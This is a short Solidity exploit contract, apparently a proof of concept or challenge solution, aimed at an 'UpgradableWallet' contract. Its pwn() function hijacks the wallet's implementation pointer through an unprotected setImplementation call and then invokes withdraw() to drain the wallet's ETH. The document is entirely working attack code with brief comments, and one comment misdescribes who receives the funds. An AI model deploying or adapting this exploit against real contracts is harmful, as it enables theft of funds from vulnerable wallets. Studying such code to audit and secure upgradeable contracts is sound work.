// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract UpgradableWalletExploit {
    // Address of the target UpgradableWallet contract.
    address public target;

    // Constructor to set the target UpgradableWallet contract address.
    constructor(address _target) {
        // Set the target to the address of the UpgradableWallet.
        target = _target;
    }
    
    // Fallback function to accept incoming ETH from the UpgradableWallet.
    receive() external payable {}

    // Function to perform the exploit on the UpgradableWallet contract.
    function pwn() external {
        // Call the setImplementation function of the target UpgradableWallet contract
        // to set its implementation to this exploit contract's address.
        target.call(abi.encodeWithSignature("setImplementation(address)", address(this)));
        
        // Call the withdraw function of the target UpgradableWallet contract.
        target.call(abi.encodeWithSignature("withdraw()"));
    }
    
    // Function to withdraw ETH from the UpgradableWallet (executed inside UpgradableWallet).
    function withdraw() external {
        // Transfer the ETH balance of this exploit contract to the caller (the UpgradableWallet).
        payable(msg.sender).transfer(address(this).balance);
    }
}